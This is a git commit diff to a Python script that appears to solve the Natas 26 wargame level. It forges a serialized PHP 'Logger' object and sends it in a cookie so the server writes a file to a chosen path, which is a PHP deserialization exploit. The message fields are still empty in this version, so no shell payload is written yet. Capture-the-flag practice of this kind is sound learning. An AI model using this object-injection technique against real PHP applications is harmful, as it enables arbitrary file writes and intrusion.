3b2fcc0ffaaa0718c956c146c9e706c254dcd189
Piotr Czajka <piotr_czajka@outlook.com>
2018-01-18 15:47:48 +0100

    I'll do this later

--- natas/natas26.py
+++ natas/natas26.py
@@ -1,10 +1,31 @@
 from natas import Natas
-from shutil import copyfileobj
 import base64
-import requests
 
 IMAGEPATH = 'natas26image.png'
+PHPSESSID = 'asdf'
 
-natas = Natas('natas26', keep_session=True)
+logfile = 'img/natas26_{PHPSESSID}.png'.format(PHPSESSID=PHPSESSID)
+initmsg = ''
+exitmsg = ''
 
+fake_drawing = ''.join(('O:6:"Logger":3:{{s:13:"LoggerlogFile";s:{logfilelen}:"{logfile}"',
+                ';s:13:"LoggerinitMsg";s:{initmsglen}:"{initmsg}"',
+                ';s:13:"LoggerexitMsg";s:{exitmsglen}:"{exitmsg}";}}')).format(
+                        logfilelen=len(logfile),
+                        initmsglen=len(initmsg),
+                        exitmsglen=len(exitmsg),
+                        logfile=logfile,
+                        initmsg=initmsg,
+                        exitmsg=exitmsg
+                        )
 
+fake_drawing = base64.encodebytes(fake_drawing.encode('ascii')).decode('ascii').replace('\n', '')
+
+natas = Natas('natas26', keep_session=True, quiet=True)
+
+natas.set_cookie('PHPSESSID', PHPSESSID)
+natas.set_cookie('drawing', fake_drawing)
+
+resp = natas.get_response()
+
+print(resp.text)
